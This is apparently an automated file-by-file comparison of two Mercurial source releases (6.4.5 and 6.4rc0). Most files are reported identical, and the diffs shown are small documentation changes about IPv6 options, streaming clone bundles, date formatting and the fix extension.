### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/hist.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/hist.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/hist.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/hist.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/huf_compress.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/huf_compress.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_compress.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_compress.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_compress_internal.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_compress_internal.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_compress_literals.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_compress_literals.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_compress_literals.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_compress_literals.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_compress_sequences.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_compress_sequences.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_compress_sequences.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_compress_sequences.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_cwksp.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_cwksp.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_double_fast.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_double_fast.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_double_fast.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_double_fast.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_fast.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_fast.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_fast.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_fast.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_lazy.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_lazy.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_lazy.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_lazy.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_ldm.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_ldm.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_ldm.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_ldm.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_opt.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_opt.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstd_opt.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstd_opt.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstdmt_compress.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstdmt_compress.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/zstdmt_compress.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/zstdmt_compress.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/huf_decompress.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/huf_decompress.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/zstd_ddict.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/zstd_ddict.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/zstd_ddict.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/zstd_ddict.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/zstd_decompress.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/zstd_decompress.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/zstd_decompress_block.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/zstd_decompress_block.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/zstd_decompress_block.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/zstd_decompress_block.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/decompress/zstd_decompress_internal.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/decompress/zstd_decompress_internal.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/deprecated/zbuff.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/deprecated/zbuff.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/deprecated/zbuff_common.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/deprecated/zbuff_common.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/deprecated/zbuff_compress.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/deprecated/zbuff_compress.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/deprecated/zbuff_decompress.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/deprecated/zbuff_decompress.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/cover.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/cover.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/cover.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/cover.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/divsufsort.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/divsufsort.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/divsufsort.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/divsufsort.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/fastcover.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/fastcover.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/zdict.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/zdict.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/dictBuilder/zdict.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/dictBuilder/zdict.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/zstd.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/zstd.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python3-ratchet.py` & `mercurial-6.4rc0/contrib/python3-ratchet.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python3-whitelist` & `mercurial-6.4rc0/contrib/python3-whitelist`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/relnotes` & `mercurial-6.4rc0/contrib/relnotes`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/revsetbenchmarks.py` & `mercurial-6.4rc0/contrib/revsetbenchmarks.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/setup-pytype.sh` & `mercurial-6.4rc0/contrib/setup-pytype.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/showstack.py` & `mercurial-6.4rc0/contrib/showstack.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/simplemerge` & `mercurial-6.4rc0/contrib/simplemerge`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/synthrepo.py` & `mercurial-6.4rc0/contrib/synthrepo.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/tcsh_completion` & `mercurial-6.4rc0/contrib/tcsh_completion`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/tcsh_completion_build.sh` & `mercurial-6.4rc0/contrib/tcsh_completion_build.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/testparseutil.py` & `mercurial-6.4rc0/contrib/testparseutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/undumprevlog` & `mercurial-6.4rc0/contrib/undumprevlog`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/vim/HGAnnotate.vim` & `mercurial-6.4rc0/contrib/vim/HGAnnotate.vim`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/vim/hg-menu.vim` & `mercurial-6.4rc0/contrib/vim/hg-menu.vim`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/vim/hgcommand.vim` & `mercurial-6.4rc0/contrib/vim/hgcommand.vim`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/vim/hgtest.vim` & `mercurial-6.4rc0/contrib/vim/hgtest.vim`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/vim/patchreview.txt` & `mercurial-6.4rc0/contrib/vim/patchreview.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/vim/patchreview.vim` & `mercurial-6.4rc0/contrib/vim/patchreview.vim`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/win32/ReadMe.html` & `mercurial-6.4rc0/contrib/win32/ReadMe.html`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/win32/hgwebdir_wsgi.py` & `mercurial-6.4rc0/contrib/win32/hgwebdir_wsgi.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/win32/mercurial.ico` & `mercurial-6.4rc0/contrib/win32/mercurial.ico`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/win32/mercurial.ini` & `mercurial-6.4rc0/contrib/win32/mercurial.ini`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/xml.rnc` & `mercurial-6.4rc0/contrib/xml.rnc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/zsh_completion` & `mercurial-6.4rc0/contrib/zsh_completion`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/Makefile` & `mercurial-6.4rc0/doc/Makefile`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/check-seclevel.py` & `mercurial-6.4rc0/doc/check-seclevel.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/docchecker` & `mercurial-6.4rc0/doc/docchecker`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/gendoc.py` & `mercurial-6.4rc0/doc/gendoc.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/hg-ssh.8` & `mercurial-6.4rc0/doc/hg-ssh.8`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/hg-ssh.8.html` & `mercurial-6.4rc0/doc/hg-ssh.8.html`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/hg.1` & `mercurial-6.4rc0/doc/hg.1`

 * *Files 0% similar despite different names*

```diff
@@ -1056,15 +1056,15 @@
 .TP
 .BI \-\-style \ <STYLE>
 .
 template style to use
 .TP
 .B \-6,  \-\-ipv6
 .
-use IPv6 instead of IPv4
+use IPv6 in addition to IPv4
 .TP
 .BI \-\-certificate \ <FILE>
 .
 SSL certificate file
 .TP
 .B \-\-print\-url
 .
@@ -6055,18 +6055,14 @@
 .TP
 .B \fBnone\fP
 .sp
 No compression is performed.
 .sp
 Use this compression engine to explicitly disable compression.
 .UNINDENT
-.sp
-The compression engines can be prepended with \fBstream\fP to create a streaming bundle.
-These are bundles that are extremely efficient to produce and consume,
-but do not have guaranteed compatibility with older clients.
 .SS Available Options
 .sp
 The following options exist:
 .INDENT 0.0
 .TP
 .B changegroup
 .
@@ -6109,23 +6105,14 @@
 .sp
 Produce a \fBv2\fP bundle with zstandard compression using default
 settings.
 .TP
 .B \fBzstd\-v1\fP
 .sp
 This errors because \fBzstd\fP is not supported for \fBv1\fP types.
-.TP
-.B \fBnone\-streamv2\fP
-.sp
-Produce a \fBv2\fP streaming bundle with no compression.
-.TP
-.B \fBzstd\-v2;obsolescence=true;phases=true\fP
-.sp
-Produce a \fBv2\fP bundle with zstandard compression which includes
-obsolescence markers and phases.
 .UNINDENT
 .SH COLORIZING OUTPUTS
 .sp
 Mercurial colorizes output from several commands.
 .sp
 For example, the diff command shows additions in green and deletions
 in red, while the status command shows modified files in magenta. Many
@@ -10539,16 +10526,16 @@
 .TP
 .B configint(section, name[, default])
 .
 Returns the requested hgrc config option as an integer.
 .TP
 .B date(date[, fmt])
 .
-Format a date. The format string uses the Python strftime format.
-The default is a Unix date format, including the timezone:
+Format a date. See \%\fBhg help dates\fP\: for formatting
+strings. The default is a Unix date format, including the timezone:
 "Mon Sep 04 15:13:13 2006 0700".
 .TP
 .B dict([[key=]value...])
 .
 Construct a dict from key\-value pairs. A key may be omitted if
 a value expression can provide an unambiguous name.
 .TP
@@ -12332,18 +12319,16 @@
 operator could use a dynamic service for retrieving bundle data. However,
 static file hosting services are simple and scalable and should be sufficient
 for most needs.
 .sp
 Bundle files can be generated with the \%\fBhg bundle\fP\: command. Typically
 \%\fBhg bundle \-\-all\fP\: is used to produce a bundle of the entire repository.
 .sp
-The bundlespec option \fIstream\fP (see \%\fBhg help bundlespec\fP\:)
-can be used to produce a special \fIstreaming clonebundle\fP, typically using
-\%\fBhg bundle \-\-all \-\-type="none\-streamv2"\fP\:.
-These are bundle files that are extremely efficient
+\%\fBhg debugcreatestreamclonebundle\fP\: can be used to produce a special
+\fIstreaming clonebundle\fP. These are bundle files that are extremely efficient
 to produce and consume (read: fast). However, they are larger than
 traditional bundle formats and require that clients support the exact set
 of repository data store formats in use by the repository that created them.
 Typically, a newer server can serve data that is compatible with older clients.
 However, \fIstreaming clone bundles\fP don\(aqt have this guarantee. \fBServer
 operators need to be aware that newer versions of Mercurial may produce
 streaming clone bundles incompatible with older Mercurial versions.\fP
@@ -13662,21 +13647,14 @@
 .SS fix
 .sp
 rewrite file content in changesets or working copy (EXPERIMENTAL)
 .sp
 Provides a command that runs configured tools on the contents of modified files,
 writing back any fixes to the working copy or replacing changesets.
 .sp
-Fixer tools are run in the repository\(aqs root directory. This allows them to read
-configuration files from the working copy, or even write to the working copy.
-The working copy is not updated to match the revision being fixed. In fact,
-several revisions may be fixed in parallel. Writes to the working copy are not
-amended into the revision being fixed; fixer tools MUST always read content to
-be fixed from stdin, and write fixed file content back to stdout.
-.sp
 Here is an example configuration that causes \%\fBhg fix\fP\: to apply automatic
 formatting fixes to modified lines in C++ code:
 .sp
 .nf
 .ft C
 [fix]
 clang\-format:command=clang\-format \-\-assume\-filename={rootpath}
@@ -13805,28 +13783,34 @@
   made obsolete. Provides a boolean "$HG_WDIRWRITTEN" to indicate whether any
   files in the working copy were updated. Provides a list "$HG_METADATA"
   mapping fixer tool names to lists of metadata values returned from
   executions that modified a file. This aggregates the same metadata
   previously passed to the "postfixfile" hook.
 .ft P
 .fi
+.sp
+Fixer tools are run in the repository\(aqs root directory. This allows them to read
+configuration files from the working copy, or even write to the working copy.
+The working copy is not updated to match the revision being fixed. In fact,
+several revisions may be fixed in parallel. Writes to the working copy are not
+amended into the revision being fixed; fixer tools should always write fixed
+file content back to stdout as documented above.
 .SS Commands
 .SS File content management
 .SS fix
 .sp
 rewrite file content in changesets or working directory:
 .sp
 .nf
 .ft C
 hg fix [OPTION]... [FILE]...
 .ft P
 .fi
 .sp
-Runs any configured tools to fix the content of files. (See
-\%\fBhg help \-e fix\fP\: for details about configuring tools.) Only affects files
+Runs any configured tools to fix the content of files. Only affects files
 with changes, unless file arguments are provided. Only affects changed lines
 of files, unless the \-\-whole flag is used. Some tools may always affect the
 whole file regardless of \-\-whole.
 .sp
 If \-\-working\-dir is used, files with uncommitted changes in the working copy
 will be fixed. Note that no backup are made.
 .sp
```

### Comparing `mercurial-6.4.5/doc/hg.1.html` & `mercurial-6.4rc0/doc/hg.1.html`

 * *Files 0% similar despite different names*

#### Comparing `mercurial-6.4.5/doc/hg.1.html` & `mercurial-6.4rc0/doc/hg.1.html`

```diff
@@ -2163,15 +2163,15 @@
                   <td class="option-group">
                     <kbd>
                       <span class="option">-6</span>
                       ,
                       <span class="option">--ipv6</span>
                     </kbd>
                   </td>
-                  <td>use IPv6 instead of IPv4</td>
+                  <td>use IPv6 in addition to IPv4</td>
                 </tr>
                 <tr>
                   <td class="option-group" colspan="2">
                     <kbd>
                       <span class="option">
                         --certificate
                         <var>&lt;FILE&gt;</var>
@@ -10625,21 +10625,14 @@
               <tt class="docutils literal">none</tt>
             </dt>
             <dd>
               <p class="first">No compression is performed.</p>
               <p class="last">Use this compression engine to explicitly disable compression.</p>
             </dd>
           </dl>
-          <p>
-            The compression engines can be prepended with
-            <tt class="docutils literal">stream</tt>
-            to create a streaming bundle.
-These are bundles that are extremely efficient to produce and consume,
-but do not have guaranteed compatibility with older clients.
-          </p>
         </div>
         <div class="section" id="available-options">
           <h2>Available Options</h2>
           <p>The following options exist:</p>
           <dl class="docutils">
             <dt>changegroup</dt>
             <dd>Include the changegroup data in the bundle (default to True).</dd>
@@ -10697,35 +10690,14 @@
             <dd>
               This errors because
               <tt class="docutils literal">zstd</tt>
               is not supported for
               <tt class="docutils literal">v1</tt>
               types.
             </dd>
-            <dt>
-              <tt class="docutils literal">
-                <span class="pre">none-streamv2</span>
-              </tt>
-            </dt>
-            <dd>
-              Produce a
-              <tt class="docutils literal">v2</tt>
-              streaming bundle with no compression.
-            </dd>
-            <dt>
-              <tt class="docutils literal">
-                <span class="pre">zstd-v2;obsolescence=true;phases=true</span>
-              </tt>
-            </dt>
-            <dd>
-              Produce a
-              <tt class="docutils literal">v2</tt>
-              bundle with zstandard compression which includes
-obsolescence markers and phases.
-            </dd>
           </dl>
         </div>
       </div>
       <div class="section" id="colorizing-outputs">
         <span id="color"/>
         <h1>
           <a class="toc-backref" href="#contents">Colorizing Outputs</a>
@@ -16586,17 +16558,23 @@
                 <td class="field-body">Returns the requested hgrc config option as an integer.</td>
               </tr>
               <tr class="field">
                 <th class="field-name" colspan="2">date(date[, fmt]):</th>
               </tr>
               <tr class="field">
                 <td/>
-                <td class="field-body">Format a date. The format string uses the Python strftime format.
-The default is a Unix date format, including the timezone:
-&quot;Mon Sep 04 15:13:13 2006 0700&quot;.</td>
+                <td class="field-body">
+                  Format a date. See
+                  <a class="reference external" href="hg.1.html#dates">
+                    <tt class="docutils literal">hg help dates</tt>
+                  </a>
+                  for formatting
+strings. The default is a Unix date format, including the timezone:
+&quot;Mon Sep 04 15:13:13 2006 0700&quot;.
+                </td>
               </tr>
               <tr class="field">
                 <th class="field-name" colspan="2">dict([[key=]value...]):</th>
               </tr>
               <tr class="field">
                 <td/>
                 <td class="field-body">Construct a dict from key-value pairs. A key may be omitted if
@@ -19171,33 +19149,20 @@
                 hg bundle
                 <span class="pre">--all</span>
               </tt>
             </a>
             is used to produce a bundle of the entire repository.
           </p>
           <p>
-            The bundlespec option
-            <cite>stream</cite>
-            (see
-            <a class="reference external" href="hg.1.html#bundlespec">
-              <tt class="docutils literal">hg help bundlespec</tt>
+            <a class="reference external" href="hg.1.html#debugcreatestreamclonebundle">
+              <tt class="docutils literal">hg debugcreatestreamclonebundle</tt>
             </a>
-            )
-can be used to produce a special
+            can be used to produce a special
             <em>streaming clonebundle</em>
-            , typically using
-            <a class="reference external" href="hg.1.html#bundle">
-              <tt class="docutils literal">
-                hg bundle
-                <span class="pre">--all</span>
-                <span class="pre">--type=&quot;none-streamv2&quot;</span>
-              </tt>
-            </a>
-            .
-These are bundle files that are extremely efficient
+            . These are bundle files that are extremely efficient
 to produce and consume (read: fast). However, they are larger than
 traditional bundle formats and require that clients support the exact set
 of repository data store formats in use by the repository that created them.
 Typically, a newer server can serve data that is compatible with older clients.
 However,
             <em>streaming clone bundles</em>
             don't have this guarantee.
@@ -21423,20 +21388,14 @@
         <div class="section" id="fix">
           <h2>
             <a class="toc-backref" href="#toc-entry-58">fix</a>
           </h2>
           <p>rewrite file content in changesets or working copy (EXPERIMENTAL)</p>
           <p>Provides a command that runs configured tools on the contents of modified files,
 writing back any fixes to the working copy or replacing changesets.</p>
-          <p>Fixer tools are run in the repository's root directory. This allows them to read
-configuration files from the working copy, or even write to the working copy.
-The working copy is not updated to match the revision being fixed. In fact,
-several revisions may be fixed in parallel. Writes to the working copy are not
-amended into the revision being fixed; fixer tools MUST always read content to
-be fixed from stdin, and write fixed file content back to stdout.</p>
           <p>
             Here is an example configuration that causes
             <a class="reference external" href="hg.1.html#fix">
               <tt class="docutils literal">hg fix</tt>
             </a>
             to apply automatic
 formatting fixes to modified lines in C++ code:
@@ -21542,36 +21501,32 @@
   Run once after all files and revisions have been handled. Provides
   &quot;$HG_REPLACEMENTS&quot; with information about what revisions were created and
   made obsolete. Provides a boolean &quot;$HG_WDIRWRITTEN&quot; to indicate whether any
   files in the working copy were updated. Provides a list &quot;$HG_METADATA&quot;
   mapping fixer tool names to lists of metadata values returned from
   executions that modified a file. This aggregates the same metadata
   previously passed to the &quot;postfixfile&quot; hook.</pre>
+          <p>Fixer tools are run in the repository's root directory. This allows them to read
+configuration files from the working copy, or even write to the working copy.
+The working copy is not updated to match the revision being fixed. In fact,
+several revisions may be fixed in parallel. Writes to the working copy are not
+amended into the revision being fixed; fixer tools should always write fixed
+file content back to stdout as documented above.</p>
           <div class="section" id="commands-14">
             <h3>Commands</h3>
             <div class="section" id="file-content-management-2">
               <h4>File content management</h4>
               <div class="section" id="fix-1">
                 <h5>fix</h5>
                 <p>rewrite file content in changesets or working directory:</p>
                 <pre class="literal-block">hg fix [OPTION]... [FILE]...</pre>
-                <p>
-                  Runs any configured tools to fix the content of files. (See
-                  <a class="reference external" href="hg.1.html#-e">
-                    <tt class="docutils literal">
-                      hg help
-                      <span class="pre">-e</span>
-                      fix
-                    </tt>
-                  </a>
-                  for details about configuring tools.) Only affects files
+                <p>Runs any configured tools to fix the content of files. Only affects files
 with changes, unless file arguments are provided. Only affects changed lines
 of files, unless the --whole flag is used. Some tools may always affect the
-whole file regardless of --whole.
-                </p>
+whole file regardless of --whole.</p>
                 <p>If --working-dir is used, files with uncommitted changes in the working copy
 will be fixed. Note that no backup are made.</p>
                 <p>If revisions are specified with --source, those revisions and their
 descendants will be checked, and they may be replaced with new revisions
 that have fixed file content. By automatically including the descendants,
 no merging, rebasing, or evolution will be required. If an ancestor of the
 working copy is included, then the working copy itself will also be fixed,
```

### Comparing `mercurial-6.4.5/doc/hgignore.5` & `mercurial-6.4rc0/doc/hgignore.5`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/hgignore.5.html` & `mercurial-6.4rc0/doc/hgignore.5.html`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/hgmanpage.py` & `mercurial-6.4rc0/doc/hgmanpage.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/hgrc.5` & `mercurial-6.4rc0/doc/hgrc.5`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/hgrc.5.html` & `mercurial-6.4rc0/doc/hgrc.5.html`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/runrst` & `mercurial-6.4rc0/doc/runrst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/doc/style.css` & `mercurial-6.4rc0/doc/style.css`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hg` & `mercurial-6.4rc0/hg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgdemandimport/__init__.py` & `mercurial-6.4rc0/hgdemandimport/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgdemandimport/demandimportpy3.py` & `mercurial-6.4rc0/hgdemandimport/demandimportpy3.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgdemandimport/tracing.py` & `mercurial-6.4rc0/hgdemandimport/tracing.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgeditor` & `mercurial-6.4rc0/hgeditor`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/absorb.py` & `mercurial-6.4rc0/hgext/absorb.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/acl.py` & `mercurial-6.4rc0/hgext/acl.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/amend.py` & `mercurial-6.4rc0/hgext/amend.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/automv.py` & `mercurial-6.4rc0/hgext/automv.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/beautifygraph.py` & `mercurial-6.4rc0/hgext/beautifygraph.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/blackbox.py` & `mercurial-6.4rc0/hgext/blackbox.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/bookflow.py` & `mercurial-6.4rc0/hgext/bookflow.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/bugzilla.py` & `mercurial-6.4rc0/hgext/bugzilla.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/censor.py` & `mercurial-6.4rc0/hgext/censor.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/children.py` & `mercurial-6.4rc0/hgext/children.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/churn.py` & `mercurial-6.4rc0/hgext/churn.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/clonebundles.py` & `mercurial-6.4rc0/hgext/clonebundles.py`

 * *Files 6% similar despite different names*

```diff
@@ -75,18 +75,16 @@
 operator could use a dynamic service for retrieving bundle data. However,
 static file hosting services are simple and scalable and should be sufficient
 for most needs.
 
 Bundle files can be generated with the :hg:`bundle` command. Typically
 :hg:`bundle --all` is used to produce a bundle of the entire repository.
 
-The bundlespec option `stream` (see :hg:`help bundlespec`)
-can be used to produce a special *streaming clonebundle*, typically using
-:hg:`bundle --all --type="none-streamv2"`.
-These are bundle files that are extremely efficient
+:hg:`debugcreatestreamclonebundle` can be used to produce a special
+*streaming clonebundle*. These are bundle files that are extremely efficient
 to produce and consume (read: fast). However, they are larger than
 traditional bundle formats and require that clients support the exact set
 of repository data store formats in use by the repository that created them.
 Typically, a newer server can serve data that is compatible with older clients.
 However, *streaming clone bundles* don't have this guarantee. **Server
 operators need to be aware that newer versions of Mercurial may produce
 streaming clone bundles incompatible with older Mercurial versions.**
```

### Comparing `mercurial-6.4.5/hgext/closehead.py` & `mercurial-6.4rc0/hgext/closehead.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/commitextras.py` & `mercurial-6.4rc0/hgext/commitextras.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/__init__.py` & `mercurial-6.4rc0/hgext/convert/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/bzr.py` & `mercurial-6.4rc0/hgext/convert/bzr.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/common.py` & `mercurial-6.4rc0/hgext/convert/common.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/convcmd.py` & `mercurial-6.4rc0/hgext/convert/convcmd.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/cvs.py` & `mercurial-6.4rc0/hgext/convert/cvs.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/cvsps.py` & `mercurial-6.4rc0/hgext/convert/cvsps.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/darcs.py` & `mercurial-6.4rc0/hgext/convert/darcs.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/filemap.py` & `mercurial-6.4rc0/hgext/convert/filemap.py`

 * *Files identical despite different names*

